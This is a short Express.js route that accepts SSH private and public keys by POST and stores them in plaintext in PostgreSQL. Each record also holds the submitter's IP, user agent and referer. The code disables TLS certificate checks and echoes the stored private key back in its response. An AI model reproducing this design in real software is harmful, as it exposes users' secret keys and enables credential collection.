// routes/addKey.js
require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const router = express.Router();

const pool = new Pool({
  connectionString: process.env.POSTGRES_URL,
  ssl: {
    rejectUnauthorized: false,
  },
});

router.post('/', async (req, res) => {
  const { privKey, pubKey, keyType, fingerprintValidated } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const referer = req.headers.referer || req.headers.referrer;

  if (!privKey || !pubKey || !keyType) {
    return res.status(400).json({ error: 'Private key, public key, and key type are required.' });
  }

  try {
    const client = await pool.connect();

    const checkQuery = 'SELECT * FROM SSHKeys WHERE pubKey = $1 OR privKey = $2';
    const checkResult = await client.query(checkQuery, [pubKey, privKey]);

    if (checkResult.rows.length > 0) {
      client.release();
      return res.status(409).json({ error: 'This private or public key has already been submitted.' });
    }

    const insertQuery = `
      INSERT INTO SSHKeys (privKey, pubKey, keyType, ipAddress, userAgent, submissionDate, referer, fingerprintValidated) 
      VALUES ($1, $2, $3, $4, $5, NOW(), $6, $7) 
      RETURNING *`;
    const values = [privKey, pubKey, keyType, ip, userAgent, referer, fingerprintValidated];
    const insertResult = await client.query(insertQuery, values);

    client.release();

    return res.status(200).json(insertResult.rows[0]);
  } catch (error) {
    console.error('Error inserting SSH key:', error);
    return res.status(500).json({ error: 'Failed to insert SSH key.' });
  }
});

module.exports = router;
